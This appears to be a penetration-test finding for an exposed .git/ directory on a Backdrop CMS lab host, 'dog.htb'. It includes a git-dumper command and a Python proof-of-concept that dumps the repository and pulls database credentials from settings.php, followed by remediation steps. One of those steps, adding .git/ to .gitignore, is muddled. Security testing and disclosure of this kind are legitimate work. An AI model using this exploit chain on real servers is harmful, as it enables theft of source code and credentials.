# Exposed Git Repository (.git/) Leading to Source Code Disclosure

**ID:** vuln-0001
**Severity:** HIGH
**Found:** 2026-03-03 18:19:28 UTC
**Target:** dog.htb
**Endpoint:** /.git/
**Method:** GET
**CWE:** CWE-548
**CVSS:** 7.5

## Description

A critical information disclosure vulnerability was identified where the entire Git repository was publicly accessible at http://dog.htb/.git/. This allowed an attacker to extract the complete source code of the Backdrop CMS application using tools like git-dumper. The repository contained 2873 files including core CMS files, configuration files, and potentially sensitive data. This exposure is typically caused by deploying applications from Git repositories without removing the .git/ directory from the web root.

## Impact

An attacker can extract the entire application source code, including:
- All PHP files and application logic
- Configuration files containing sensitive credentials
- Database connection strings
- System architecture and business logic
- Version history and potential secrets in commit messages
This information can be used to identify further vulnerabilities, craft targeted attacks, or obtain credentials for unauthorized access.

## Technical Analysis

The vulnerability exists because the .git/ directory was not removed or protected when the application was deployed to the production web server. The Git repository was fully accessible, allowing complete extraction via standard Git tools. The extracted source code revealed Backdrop CMS version 1.27.1 and contained critical configuration files including settings.php with database credentials in plaintext.

## Proof of Concept

1. Navigate to http://dog.htb/.git/
2. Observe that the Git repository is accessible
3. Use git-dumper tool to extract the full repository:
   git-dumper http://dog.htb/ ./extracted_source
4. Browse extracted files to find sensitive information
5. Access settings.php to obtain database credentials

```
#!/usr/bin/env python3
"""Proof of Concept for Git Repository Exposure"""

import requests
import subprocess
import os

TARGET = "http://dog.htb"
GIT_URL = f"{TARGET}/.git/"

def check_git_exposure():
    """Check if .git/ directory is exposed"""
    print(f"[*] Checking Git repository exposure at {GIT_URL}")
    
    # Check if .git/HEAD is accessible
    r = requests.get(f"{GIT_URL}HEAD", timeout=10)
    if r.status_code == 200 and "ref:" in r.text:
        print(f"[+] Git repository is exposed!")
        print(f"    HEAD content: {r.text.strip()}")
        return True
    else:
        print(f"[-] Git repository not exposed or protected")
        return False

def extract_repository():
    """Extract the Git repository using git-dumper"""
    print("\n[*] Extracting repository...")
    try:
        subprocess.run([
            "git-dumper", 
            GIT_URL, 
            "./extracted_source"
        ], check=True, timeout=120)
        print("[+] Repository extracted successfully")
        return True
    except Exception as e:
        print(f"[-] Extraction failed: {e}")
        return False

def find_credentials():
    """Search for credentials in extracted source"""
    print("\n[*] Searching for credentials...")
    settings_file = "./extracted_source/settings.php"
    if os.path.exists(settings_file):
        with open(settings_file, 'r') as f:
            content = f.read()
            if 'database' in content:
                print("[+] Database configuration found in settings.php")
                # Extract database line
                for line in content.split('\n'):
                    if '$database' in line and 'mysql' in line:
                        print(f"    {line.strip()}")
                return True
    return False

if __name__ == "__main__":
    if check_git_exposure():
        if extract_repository():
            find_credentials()
```

## Remediation

1. Remove the .git/ directory from the web root:
   rm -rf /var/www/html/.git/

2. If Git is needed for deployment, move it outside the web root:
   mv /var/www/html/.git/ /var/git/backdrop.git/

3. Add .git/ to .gitignore if using CI/CD pipelines

4. Configure web server to deny access to .git/ directories:
   Apache (.htaccess):
   RewriteRule ^(.*/)?\.git/ - [F,L]

   Nginx:
   location ~ /\.git {
       deny all;
       return 403;
   }

5. Implement automated scanning in CI/CD pipeline to detect exposed .git/ directories before deployment

6. Review and rotate any credentials that may have been exposed in the repository history
